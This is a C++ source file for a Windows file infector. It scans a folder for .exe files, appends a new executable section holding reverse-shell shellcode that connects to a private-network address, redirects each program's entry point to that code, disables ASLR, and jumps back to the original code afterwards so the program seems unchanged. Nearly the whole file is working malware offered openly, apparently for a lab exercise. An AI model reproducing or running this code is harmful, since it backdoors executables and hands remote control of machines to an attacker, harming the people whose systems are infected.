#include <iostream>
#include <fstream>
#include <Windows.h>
#include <vector>

BYTE shellcode[] = {
	"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b"
	"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
	"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
	"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20"
	"\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac"
	"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
	"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
	"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
	"\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
	"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00"
	"\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
	"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
	"\x40\x07\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
	"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5"
	"\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
	"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
	"\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56"
	"\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
	"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"
	"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
	"\x00\x53\x68\x00\x00\x00\x00\xc3"
	// TCP Reverse Shell
	// After the TCP connection closes, it will jump back to the OriginalEntryPoint
	// and the original program will run back to normal
};

void printErrorMessage(const std::string& message) {
    std::cerr << message << std::endl;
}

bool readAndInjectShellcode(const std::wstring& filePath) {
    HANDLE fileHandle = CreateFile(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        printErrorMessage("Failed to open file");
        return false;
    }

    DWORD fileSize = GetFileSize(fileHandle, nullptr);
    if (fileSize == INVALID_FILE_SIZE) {
        printErrorMessage("Failed to get file size");
        CloseHandle(fileHandle);
        return false;
    }

    BYTE* fileBuffer = new BYTE[fileSize];
    if (fileBuffer == nullptr) {
        printErrorMessage("Failed to allocate memory");
        CloseHandle(fileHandle);
        return false;
    }

    DWORD bytesRead;
    if (!ReadFile(fileHandle, fileBuffer, fileSize, &bytesRead, nullptr)) {
        printErrorMessage("Failed to read file");
        delete[] fileBuffer;
        CloseHandle(fileHandle);
        return false;
    }
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)(fileBuffer);
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	DWORD imageBase = ntHeader->OptionalHeader.ImageBase;
	DWORD ret = SetFilePointer(fileHandle, dosHeader->e_lfanew, NULL, FILE_BEGIN);
	DWORD newCharacteristics;
	DWORD offsetToDllCharacteristics = ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32, DllCharacteristics);

	if (ret != INVALID_SET_FILE_POINTER) {

		// Get the address of the last section
		IMAGE_SECTION_HEADER lastSection = sectionHeader[ntHeader->FileHeader.NumberOfSections - 1];

		// Get the size of the code and RVA of the new section
		DWORD fileAlignment = ntHeader->OptionalHeader.FileAlignment;
		DWORD sectionAlignment = ntHeader->OptionalHeader.SectionAlignment;
		DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
		DWORD newSectionVirtualAddress = lastSection.VirtualAddress + (lastSection.Misc.VirtualSize + (sectionAlignment - 1) & ~(sectionAlignment - 1));
		size_t codeSize = sizeof(shellcode) - 1;

		// Create new section
		IMAGE_SECTION_HEADER newSection = {};
		auto isize = sizeof(newSection.Name);
		strncpy_s(reinterpret_cast<char*>(newSection.Name), isize, ".abc", sizeof(".abc"));
		newSection.Misc.VirtualSize = codeSize; // Total size of the section when loaded into the memory
		newSection.SizeOfRawData = (codeSize + (fileAlignment - 1) & ~(fileAlignment - 1)); // Size of the section's initialized data on disk
		newSection.PointerToRawData = lastSection.PointerToRawData + lastSection.SizeOfRawData;
		newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
		newSection.VirtualAddress = newSectionVirtualAddress;

		// Add new section information to section header
		SetFilePointer(fileHandle, ret + sizeof(IMAGE_NT_HEADERS) + ntHeader->FileHeader.NumberOfSections * 40, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &newSection, sizeof(newSection), NULL, NULL);

		// Update the number of section existed within the file
		ntHeader->FileHeader.NumberOfSections++;
		SetFilePointer(fileHandle, ret + 6, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &ntHeader->FileHeader.NumberOfSections, sizeof(DWORD), NULL, NULL);

		// Inject the shellcode
		SetFilePointer(fileHandle, newSection.PointerToRawData, NULL, FILE_BEGIN);
		WriteFile(fileHandle, shellcode, codeSize, NULL, NULL);

		// Calculate the original Entrypoint to jump back and writes to the shellcode
		DWORD orgEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint + imageBase;
		SetFilePointer(fileHandle, newSection.PointerToRawData + codeSize - 5, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &orgEntryPoint, sizeof(DWORD), NULL, NULL);

		// Turn off DLL can move flag
		SetFilePointer(fileHandle, offsetToDllCharacteristics, NULL, FILE_BEGIN);
		BOOL readDllCharacteristics = ReadFile(fileHandle, &newCharacteristics, sizeof(newCharacteristics), &bytesRead, NULL);
		if (!readDllCharacteristics) {
			printErrorMessage("Failed to read DllCharacteristics");
			CloseHandle(fileHandle);
			delete[] fileBuffer;
			return 1;
		}
		newCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

		// Write the modified DllCharacteristics field back to the file
		SetFilePointer(fileHandle, -static_cast<LONG>(sizeof(newCharacteristics)), NULL, FILE_CURRENT);
		WriteFile(fileHandle, &newCharacteristics, sizeof(newCharacteristics), &bytesRead, NULL);

		// Recalculate the SizeOfImage and roundit up with SectionAlignment
		sizeOfImage = sizeOfImage + codeSize + (sectionAlignment - 1) & ~(sectionAlignment - 1);
		SetFilePointer(fileHandle, ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32,SizeOfImage), NULL, FILE_BEGIN);
		WriteFile(fileHandle, &sizeOfImage, sizeof(DWORD), NULL, NULL);
		SetFilePointer(fileHandle, newSection.PointerToRawData + newSection.SizeOfRawData, NULL, FILE_BEGIN);
		SetEndOfFile(fileHandle);

		// Adjust the AddressOfEntryPoint to point to the new section
		ntHeader->OptionalHeader.AddressOfEntryPoint = newSectionVirtualAddress;
		SetFilePointer(fileHandle, ret + 40, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &newSectionVirtualAddress, sizeof(DWORD), NULL, NULL);
	}
	else {
		printErrorMessage("Failed to read PE Header");
	}

    delete[] fileBuffer;
    CloseHandle(fileHandle);
    return true;
}

// Checking through the directory to find and affect all PE files in it
std::vector<std::wstring> findPEFilesInDirectory(const std::wstring& directory) {
	std::vector<std::wstring> peFiles;
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = FindFirstFile((directory + L"\\*").c_str(), &findFileData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				std::wstring fileName = findFileData.cFileName;
				if (fileName.length() > 4 && fileName.substr(fileName.length() - 4) == L".exe") {
					peFiles.push_back(directory + L"\\" + fileName);
				}
			}
		} while (FindNextFile(hFind, &findFileData) != 0);
		FindClose(hFind);
	}
	return peFiles;
}

int main() {
	const std::wstring directory = L"C:\\Users\\Avenger\\Desktop\\Test";
	
	std::vector<std::wstring> peFiles = findPEFilesInDirectory(directory);
	if (peFiles.empty()) {
		printErrorMessage("No PE files found in directory");
		return 1;
	}
	
	for (const auto& filePath : peFiles) {
		if (readAndInjectShellcode(filePath)) {
			std::wcout << L"Shellcode injected successfully into: " << filePath << std::endl;
		}
		else {
			printErrorMessage("Failed to inject shellcode into: " + std::string(filePath.begin(), filePath.end()));
		}
	}
	
	return 0;
}
